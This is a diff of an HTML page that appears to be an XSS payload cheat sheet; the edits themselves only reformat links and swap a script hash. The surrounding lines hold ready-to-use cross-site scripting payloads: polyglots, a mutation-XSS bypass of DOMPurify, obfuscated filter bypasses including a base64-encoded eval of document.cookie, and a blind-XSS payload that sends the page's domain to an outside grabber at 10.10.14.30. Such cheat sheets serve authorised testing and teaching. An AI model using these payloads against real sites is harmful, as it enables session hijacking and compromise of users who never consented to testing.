@@ -16,7 +16,7 @@
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.c3b45b6301b51f548f0398109b6e109d45abf1314e421f8ba62cf6f72646f958.js" integrity="sha256-w7RbYwG1H1SPA5gQm24QnUWr8TFOQh&#43;Lpiz29yZG&#43;Vg=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.4e979c41ea1da3eadea6cff7d8575b0664a8627f9c4b12e833490d3df55a9f7b.js" integrity="sha256-TpecQeodo&#43;reps/32FdbBmSoYn&#43;cSxLoM0kNPfVan3s=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -81,10 +81,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-  
-    
-  
-
 
 
 <ul class="book-languages">
@@ -98,12 +94,6 @@ https://github.com/alex-shpak/hugo-book
     </label>
 
     <ul>
-      
-      <li>
-        <a href="https://www.grayhatfreelancing.com/ru/">
-          Ukrainian
-        </a>
-      </li>
       
     </ul>
   </li>
@@ -1590,21 +1580,14 @@ https://github.com/alex-shpak/hugo-book
   Other ways
   <a class="anchor" href="#other-ways">#</a>
 </h3>
-<p>More exploits at 
-  <a href="http://www.xss-payloads.com/payloads-list.html?a#category=all">http://www.xss-payloads.com/payloads-list.html?a#category=all</a>:</p>
+<p>More exploits at <a href="http://www.xss-payloads.com/payloads-list.html?a#category=all">http://www.xss-payloads.com/payloads-list.html?a#category=all</a>:</p>
 <ul>
-<li>
-  <a href="https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/">Taking screenshots using XSS and the HTML5 Canvas</a></li>
-<li>
-  <a href="http://www.gnucitizen.org/blog/javascript-port-scanner/">JavaScript Port Scanner</a></li>
-<li>
-  <a href="http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html">Network Scanner</a></li>
-<li>
-  <a href="http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html">.NET Shell execution</a></li>
-<li>
-  <a href="http://www.xss-payloads.com/payloads/scripts/redirectform.js.html">Redirect Form</a></li>
-<li>
-  <a href="http://www.xss-payloads.com/payloads/scripts/playmusic.js.html">Play Music</a></li>
+<li><a href="https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/">Taking screenshots using XSS and the HTML5 Canvas</a></li>
+<li><a href="http://www.gnucitizen.org/blog/javascript-port-scanner/">JavaScript Port Scanner</a></li>
+<li><a href="http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html">Network Scanner</a></li>
+<li><a href="http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html">.NET Shell execution</a></li>
+<li><a href="http://www.xss-payloads.com/payloads/scripts/redirectform.js.html">Redirect Form</a></li>
+<li><a href="http://www.xss-payloads.com/payloads/scripts/playmusic.js.html">Play Music</a></li>
 </ul>
 <h2 id="identify-an-xss-endpoint">
   Identify an XSS endpoint
@@ -1612,8 +1595,7 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 <p>This payload opens the debugger in the developer console rather than triggering a popup alert box.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">debugger</span>;<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
-</span></span></code></pre></div><p>Modern applications with content hosting can use 
-  <a href="https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html">sandbox domains</a></p>
+</span></span></code></pre></div><p>Modern applications with content hosting can use <a href="https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html">sandbox domains</a></p>
 <blockquote>
 <p>to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can&rsquo;t access any user data.</p>
 </blockquote>
@@ -1625,12 +1607,9 @@ https://github.com/alex-shpak/hugo-book
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Test XSS from the search bar of page XYZ\n&#34;</span>.<span style="color:#a6e22e">concat</span>(document.<span style="color:#a6e22e">domain</span>).<span style="color:#a6e22e">concat</span>(<span style="color:#e6db74">&#34;\n&#34;</span>).<span style="color:#a6e22e">concat</span>(window.<span style="color:#a6e22e">origin</span>))&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span></code></pre></div><p>References:</p>
 <ul>
-<li>
-  <a href="https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain">Google Bughunter University - XSS in sandbox domains</a></li>
-<li>
-  <a href="https://www.youtube.com/watch?v=KHwVjzWei1c">LiveOverflow Video - DO NOT USE alert(1) for XSS</a></li>
-<li>
-  <a href="https://liveoverflow.com/do-not-use-alert-1-in-xss/">LiveOverflow blog post - DO NOT USE alert(1) for XSS</a></li>
+<li><a href="https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain">Google Bughunter University - XSS in sandbox domains</a></li>
+<li><a href="https://www.youtube.com/watch?v=KHwVjzWei1c">LiveOverflow Video - DO NOT USE alert(1) for XSS</a></li>
+<li><a href="https://liveoverflow.com/do-not-use-alert-1-in-xss/">LiveOverflow blog post - DO NOT USE alert(1) for XSS</a></li>
 </ul>
 <h3 id="tools">
   Tools
@@ -1638,16 +1617,11 @@ https://github.com/alex-shpak/hugo-book
 </h3>
 <p>Most tools are also suitable for blind XSS attacks:</p>
 <ul>
-<li>
-  <a href="https://github.com/s0md3v/XSStrike">XSSStrike</a>: Very popular but unfortunately not very well maintained</li>
-<li>
-  <a href="https://github.com/epsylon/xsser">xsser</a>: Utilizes a headless browser to detect XSS vulnerabilities</li>
-<li>
-  <a href="https://github.com/hahwul/dalfox">Dalfox</a>: Extensive functionality and extremely fast thanks to the implementation in Go</li>
-<li>
-  <a href="https://github.com/hahwul/XSpear">XSpear</a>: Similar to Dalfox but based on Ruby</li>
-<li>
-  <a href="https://github.com/fcavallarin/domdig">domdig</a>: Headless Chrome XSS Tester</li>
+<li><a href="https://github.com/s0md3v/XSStrike">XSSStrike</a>: Very popular but unfortunately not very well maintained</li>
+<li><a href="https://github.com/epsylon/xsser">xsser</a>: Utilizes a headless browser to detect XSS vulnerabilities</li>
+<li><a href="https://github.com/hahwul/dalfox">Dalfox</a>: Extensive functionality and extremely fast thanks to the implementation in Go</li>
+<li><a href="https://github.com/hahwul/XSpear">XSpear</a>: Similar to Dalfox but based on Ruby</li>
+<li><a href="https://github.com/fcavallarin/domdig">domdig</a>: Headless Chrome XSS Tester</li>
 </ul>
 <h2 id="xss-in-htmlapplications">
   XSS in HTML/Applications
@@ -1910,8 +1884,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
   XSS Hunter
   <a class="anchor" href="#xss-hunter">#</a>
 </h3>
-<p>Available at 
-  <a href="https://xsshunter.com/app">https://xsshunter.com/app</a></p>
+<p>Available at <a href="https://xsshunter.com/app">https://xsshunter.com/app</a></p>
 <blockquote>
 <p>XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.</p>
 </blockquote>
@@ -1927,12 +1900,9 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
   <a class="anchor" href="#other-blind-xss-tools">#</a>
 </h3>
 <ul>
-<li>
-  <a href="https://github.com/Netflix-Skunkworks/sleepy-puppy">sleepy-puppy - Netflix</a></li>
-<li>
-  <a href="https://github.com/LewisArdern/bXSS">bXSS - LewisArdern</a></li>
-<li>
-  <a href="https://github.com/ssl/ezXSS">ezXSS - ssl</a></li>
+<li><a href="https://github.com/Netflix-Skunkworks/sleepy-puppy">sleepy-puppy - Netflix</a></li>
+<li><a href="https://github.com/LewisArdern/bXSS">bXSS - LewisArdern</a></li>
+<li><a href="https://github.com/ssl/ezXSS">ezXSS - ssl</a></li>
 </ul>
 <h3 id="blind-xss-endpoint">
   Blind XSS endpoint
@@ -1963,8 +1933,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
   Tips
   <a class="anchor" href="#tips">#</a>
 </h3>
-<p>You can use a 
-  <a href="/#data-grabber-for-xss">Data grabber for XSS</a> and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.</p>
+<p>You can use a <a href="#data-grabber-for-xss">Data grabber for XSS</a> and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.</p>
 <p>Eg. payload</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://10.10.14.30:8080/XSS/grabber.php?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">domain</span>&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span></code></pre></div><p>Eg. one-line HTTP server:</p>
@@ -1974,9 +1943,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
   <a class="anchor" href="#mutated-xss">#</a>
 </h2>
 <p>Use browsers quirks to recreate some HTML tags when it is inside an <code>element.innerHTML</code>.</p>
-<p>Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at 
-  <a href="https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/">https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/</a> and 
-  <a href="https://research.securitum.com/dompurify-bypass-using-mxss/">https://research.securitum.com/dompurify-bypass-using-mxss/</a>.</p>
+<p>Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at <a href="https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/">https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/</a> and <a href="https://research.securitum.com/dompurify-bypass-using-mxss/">https://research.securitum.com/dompurify-bypass-using-mxss/</a>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">noscript</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">p</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&#34;</span><span style="color:#f92672">&gt;</span>
 </span></span></code></pre></div><h2 id="polyglot-xss">
   Polyglot XSS
@@ -2005,16 +1972,12 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">/&lt;/title/&#39;/&lt;/style/&lt;/script/&lt;/textarea/--&gt;&lt;p&#34; onclick=alert()//&gt;*/alert()/*</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#75715e">//--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;svg &#34;//&#39; onclick=alert()//
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">/&lt;/title/&#39;/&lt;/style/&lt;/script/--&gt;&lt;p&#34; onclick=alert()//&gt;*/alert()/*</span>
-</span></span></code></pre></div><p>Polyglot XSS - 
-  <a href="https://twitter.com/s0md3v/status/966175714302144514">@s0md3v</a>
-
-  <img src="https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg" alt="https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg" /></p>
+</span></span></code></pre></div><p>Polyglot XSS - <a href="https://twitter.com/s0md3v/status/966175714302144514">@s0md3v</a>
+<img src="https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg" alt="https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg" /></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">--&gt;</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#e6db74">&#34;/&gt;&lt;/sCript&gt;&lt;svG x=&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span>(<span style="color:#a6e22e">co\u006efirm</span>)<span style="color:#e6db74">``</span><span style="color:#f92672">&gt;</span>
-</span></span></code></pre></div><p>
-  <img src="https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large" alt="https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large" /></p>
+</span></span></code></pre></div><p><img src="https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large" alt="https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large" /></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">svg</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">Ao</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">nload</span><span style="color:#f92672">=%</span><span style="color:#ae81ff">09</span>((<span style="color:#a6e22e">pro\u006dpt</span>))()<span style="color:#75715e">//
-</span></span></span></code></pre></div><p>Polyglot XSS - from 
-  <a href="http://polyglot.innerht.ml">@filedescriptor&rsquo;s Polyglot Challenge</a></p>
+</span></span></span></code></pre></div><p>Polyglot XSS - from <a href="http://polyglot.innerht.ml">@filedescriptor&rsquo;s Polyglot Challenge</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">by</span> <span style="color:#a6e22e">crlf</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;/*&#39;/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \&#34; onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
@@ -2026,8 +1989,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># by h1/ragnar
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">javascript:`//&#34;</span><span style="color:#75715e">//\&#34;//&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;/template&gt;&amp;lt;svg/onload=&#39;/*--&gt;&lt;html */ onmouseover=alert()//&#39;&gt;`
-</span></span></span></code></pre></div><p>Polyglot XSS - from 
-  <a href="https://brutelogic.com.br/blog/building-xss-polyglots/">brutelogic</a></p>
+</span></span></span></code></pre></div><p>Polyglot XSS - from <a href="https://brutelogic.com.br/blog/building-xss-polyglots/">brutelogic</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">JavaScript</span><span style="color:#f92672">:</span><span style="color:#75715e">//%250Aalert?.(1)//&#39;/*\&#39;/*&#34;/*\&#34;/*`/*\`/*%26apos;)/*&lt;!--&gt;&lt;/Title/&lt;/Style/&lt;/Script/&lt;/textArea/&lt;/iFrame/&lt;/noScript&gt;\74k&lt;K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//&gt;&lt;Base/Href=//X55.is\76--&gt;
 </span></span></span></code></pre></div><h2 id="filter-bypass-and-exotic-payloads">
   Filter Bypass and exotic payloads
@@ -2088,8 +2050,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>window[<span style="color:#e6db74">&#39;alert&#39;</span>](document[<span style="color:#e6db74">&#39;domain&#39;</span>])<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
 </span></span></code></pre></div><p>Convert IP address into decimal format: IE. <code>http://192.168.1.1</code> == <code>http://3232235777</code>
-
-  <a href="http://www.geektools.com/cgi-bin/ipconv.cgi">http://www.geektools.com/cgi-bin/ipconv.cgi</a></p>
+<a href="http://www.geektools.com/cgi-bin/ipconv.cgi">http://www.geektools.com/cgi-bin/ipconv.cgi</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>eval(<span style="color:#a6e22e">atob</span>(<span style="color:#e6db74">&#34;YWxlcnQoZG9jdW1lbnQuY29va2llKQ==&#34;</span>))<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
 </span></span></code></pre></div><p>Base64 encoding your XSS payload with Linux command: IE. <code>echo -n &quot;alert(document.cookie)&quot; | base64</code> == <code>YWxlcnQoZG9jdW1lbnQuY29va2llKQ==</code></p>
 <h3 id="bypass-parenthesis-for-string">
@@ -2142,8 +2103,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
   Bypass email filter
   <a class="anchor" href="#bypass-email-filter">#</a>
 </h3>
-<p>(
-  <a href="http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate">RFC compliant</a>)</p>
+<p>(<a href="http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate">RFC compliant</a>)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#e6db74">&#34;&gt;&lt;svg/onload=confirm(1)&gt;&#34;</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">y</span>
 </span></span></code></pre></div><h3 id="bypass-document-blacklist">
   Bypass document blacklist
@@ -2171,8 +2131,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
   Bypass using an alternate way to execute an alert
   <a class="anchor" href="#bypass-using-an-alternate-way-to-execute-an-alert">#</a>
 </h3>
-<p>From 
-  <a href="https://twitter.com/brutelogic/status/965642032424407040">@brutelogic</a> tweet.</p>
+<p>From <a href="https://twitter.com/brutelogic/status/965642032424407040">@brutelogic</a> tweet.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>window[<span style="color:#e6db74">&#39;alert&#39;</span>](<span style="color:#ae81ff">0</span>)
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">parent</span>[<span style="color:#e6db74">&#39;alert&#39;</span>](<span style="color:#ae81ff">1</span>)
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">self</span>[<span style="color:#e6db74">&#39;alert&#39;</span>](<span style="color:#ae81ff">2</span>)
@@ -2187,8 +2146,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
 </span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">10</span>].<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">alert</span>)
 </span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">11</span>].<span style="color:#a6e22e">findIndex</span>(<span style="color:#a6e22e">alert</span>)
 </span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">12</span>].<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">alert</span>);
-</span></span></code></pre></div><p>From 
-  <a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/">@theMiddle</a> - Using global variables</p>
+</span></span></code></pre></div><p>From <a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/">@theMiddle</a> - Using global variables</p>
 <p>The Object.keys() method returns an array of a given object&rsquo;s own property names, in the same order as we get with a normal loop. That&rsquo;s means that we can access any JavaScript function by using its <strong>index number instead the function name</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">self</span>) { <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;alert&#34;</span>) { <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">c</span>); } <span style="color:#a6e22e">c</span><span style="color:#f92672">++</span>; }
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// 5
@@ -2204,14 +2162,12 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">self</span>[Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">self</span>)[<span style="color:#a6e22e">a</span>()]](<span style="color:#e6db74">&#34;1&#34;</span>) <span style="color:#75715e">// alert(&#34;1&#34;)
 </span></span></span></code></pre></div><p>Oneliner:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">=</span>()=&gt;{<span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">self</span>){<span style="color:#66d9ef">if</span>(<span style="color:#e6db74">/^a[rel]+t$/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">i</span>)){<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>}<span style="color:#a6e22e">c</span><span style="color:#f92672">++</span>}};<span style="color:#a6e22e">self</span>[Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">self</span>)[<span style="color:#a6e22e">a</span>()]](<span style="color:#e6db74">&#34;1&#34;</span>)
-</span></span></code></pre></div><p>From 
-  <a href="https://twitter.com/quanyang/status/1078536601184030721">@quanyang</a> tweet.</p>
+</span></span></code></pre></div><p>From <a href="https://twitter.com/quanyang/status/1078536601184030721">@quanyang</a> tweet.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">prompt</span><span style="color:#e6db74">`</span><span style="color:#e6db74">${</span>document.<span style="color:#a6e22e">domain</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
 </span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;java\tscript:alert(1)&#39;</span>
 </span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;java\rscript:alert(1)&#39;</span>
 </span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;java\tscript:alert(1)&#39;</span>
-</span></span></code></pre></div><p>From 
-  <a href="https://twitter.com/404death/status/1011860096685502464">@404death</a> tweet.</p>
+</span></span></code></pre></div><p>From <a href="https://twitter.com/404death/status/1011860096685502464">@404death</a> tweet.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>eval(<span style="color:#e6db74">&#39;ale&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;rt(0)&#39;</span>);
 </span></span><span style="display:flex;"><span>Function(<span style="color:#e6db74">&#34;ale&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;rt(1)&#34;</span>)();
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> Function<span style="color:#e6db74">`al\ert\`6\``</span>;
@@ -2292,8 +2248,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
   Bypass using Katana
   <a class="anchor" href="#bypass-using-katana">#</a>
 </h3>
-<p>Using the 
-  <a href="https://github.com/aemkei/katakana.js">Katakana</a> library.</p>
+<p>Using the <a href="https://github.com/aemkei/katakana.js">Katakana</a> library.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span>([,<span style="color:#a6e22e">ウ</span>,,,,<span style="color:#a6e22e">ア</span>]<span style="color:#f92672">=</span>[]<span style="color:#f92672">+</span>{},[<span style="color:#a6e22e">ネ</span>,<span style="color:#a6e22e">ホ</span>,<span style="color:#a6e22e">ヌ</span>,<span style="color:#a6e22e">セ</span>,,<span style="color:#a6e22e">ミ</span>,<span style="color:#a6e22e">ハ</span>,<span style="color:#a6e22e">ヘ</span>,,,<span style="color:#a6e22e">ナ</span>]<span style="color:#f92672">=</span>[<span style="color:#f92672">!!</span><span style="color:#a6e22e">ウ</span>]<span style="color:#f92672">+!</span><span style="color:#a6e22e">ウ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ウ</span>.<span style="color:#a6e22e">ウ</span>)[<span style="color:#a6e22e">ツ</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ア</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ウ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ナ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ヘ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ネ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ホ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ヌ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ア</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ネ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ウ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ホ</span>][<span style="color:#a6e22e">ツ</span>](<span style="color:#a6e22e">ミ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ハ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">セ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ホ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ネ</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;(-~ウ)&#39;</span>)()
 </span></span></code></pre></div><h3 id="bypass-using-cuneiform">
   Bypass using Cuneiform
@@ -2308,8 +2263,7 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
   <a class="anchor" href="#bypass-using-lontara">#</a>
 </h3>
